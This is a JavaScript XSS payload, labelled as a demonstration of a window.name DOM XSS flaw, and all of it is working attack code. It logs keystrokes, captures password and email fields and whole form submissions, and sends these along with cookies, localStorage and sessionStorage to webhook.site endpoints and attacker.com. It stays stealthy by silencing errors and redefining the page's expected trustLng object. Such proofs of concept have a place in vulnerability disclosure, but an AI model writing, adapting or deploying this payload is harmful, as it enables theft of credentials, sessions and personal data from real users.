// DOM XSS Keylogger Demonstration Payload
// This demonstrates the severity of the window.name XSS vulnerability

// Initialize keylogger storage
var keylogBuffer = [];
var lastKeystroke = Date.now();

// Function to send captured keystrokes to attacker's server
function transmitKeystrokes(keys) {
    // Send keystrokes to attacker-controlled server
    fetch('https://webhook.site/ccb9e869-e75c-40b0-b3af-784fe6dfdb8c', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            type: 'keystrokes',
            data: keys,
            url: location.href,
            timestamp: Date.now(),
            userAgent: navigator.userAgent
        })
    }).catch(() => {
        // Silently fail to avoid detection
    });
}

// Main keylogger function
function captureKeystroke(event) {
    var key = event.key;
    var timestamp = Date.now();
    
    // Filter out system keys for demo clarity
    if (key.length === 1 || key === 'Backspace' || key === 'Enter' || key === 'Tab') {
        // Special handling for sensitive keys
        if (key === 'Backspace') {
            keylogBuffer.push('[BACKSPACE]');
        } else if (key === 'Enter') {
            keylogBuffer.push('[ENTER]');
        } else if (key === 'Tab') {
            keylogBuffer.push('[TAB]');
        } else {
            keylogBuffer.push(key);
        }
        
        lastKeystroke = timestamp;
        
        // Send keystrokes every 10 characters or after 3 seconds of inactivity
        if (keylogBuffer.length >= 10 || (timestamp - lastKeystroke > 3000 && keylogBuffer.length > 0)) {
            transmitKeystrokes(keylogBuffer.join(''));
            keylogBuffer = [];
        }
    }
}

// Enhanced keylogger that captures form-specific data
function captureFormData(event) {
    if (event.target.type === 'password') {
        // Immediately send password field data
        fetch('https://attacker.com/collect', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                type: 'password',
                value: event.target.value,
                fieldName: event.target.name || event.target.id,
                url: location.href,
                timestamp: Date.now()
            })
        }).catch(() => {});
    }
    
    if (event.target.type === 'email' || event.target.name === 'email') {
        // Send email field data
        fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                type: 'email',
                value: event.target.value,
                fieldName: event.target.name || event.target.id,
                url: location.href,
                timestamp: Date.now()
            })
        }).catch(() => {});
    }
}

// Install keylogger
document.addEventListener('keydown', captureKeystroke, true);
document.addEventListener('input', captureFormData, true);

// Send initial compromise notification
fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        type: 'compromise',
        url: location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
        referrer: document.referrer
    })
}).catch(() => {});

// Provide the expected language object to maintain stealth
trustLng = {
    "FeedbackName": "Your Name",
    "FeedbackEmail": "Email Address", 
    "FeedbackMail": "Send Feedback",
    "FeedbackSubject": "Subject",
    "FeedbackDesc": "Description",
    "FeedbackWasSent": "Feedback sent successfully",
    "FeedbackMailFail": "Failed to send feedback",
    "FeedbackNegishutSend?": "Send feedback?",
    "FeedbackNegishutSendError": "Please check your input",
    "FeedbackEmailBad": "Invalid email format",
    "FeedbackEmailGood": "Valid email format",
    "Feedback": "Feedback"
};

// Capture form submissions
document.addEventListener('submit', function(event) {
    var formData = new FormData(event.target);
    var formObject = {};
    formData.forEach((value, key) => {
        formObject[key] = value;
    });
    
    fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            type: 'form_submission',
            formData: formObject,
            url: location.href,
            timestamp: Date.now()
        })
    }).catch(() => {});
}, true);
